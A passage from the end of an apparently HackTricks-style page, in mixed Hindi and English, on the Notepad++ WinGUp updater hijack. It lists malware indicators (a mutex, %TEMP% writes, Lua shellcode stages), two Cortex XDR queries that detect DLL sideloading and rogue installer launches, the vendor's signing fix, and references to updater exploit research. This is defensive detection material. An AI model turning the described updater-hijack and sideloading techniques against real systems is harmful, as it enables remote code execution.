- इस chain में देखे गए **malware-विशिष्ट artifacts** पर monitor करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में `gup.exe` द्वारा की गई असामान्य writes, और Lua-चालित shellcode injection stages।
- Notepad++ ने v8.8.9 और बाद के versions में WinGUp को मजबूत करके जवाब दिया: अब लौटाया गया XML signed होता है (XMLDSig), और नए builds केवल transport पर भरोसा करने के बजाय downloaded installer का certificate + signature verification लागू करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE द्वारा <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> द्वारा Notepad++ के अलावा किसी अन्य installer को launch करना</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

ये पैटर्न ऐसे किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer के signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading से “trusted” updates की आड़ में remote code execution मिलता है।

---
## References
- [1] [Advisory – Windows के लिए Netskope Client – Rogue Server के ज़रिए Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 पर Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के ज़रिए Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors द्वारा Notepad++ Supply Chain का Exploit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident पर अपडेट](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows के लिए Netskope Client में CVE-2025-0309 के fix को Bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation Bugs का पता लगाना](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC से SYSTEM तक](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
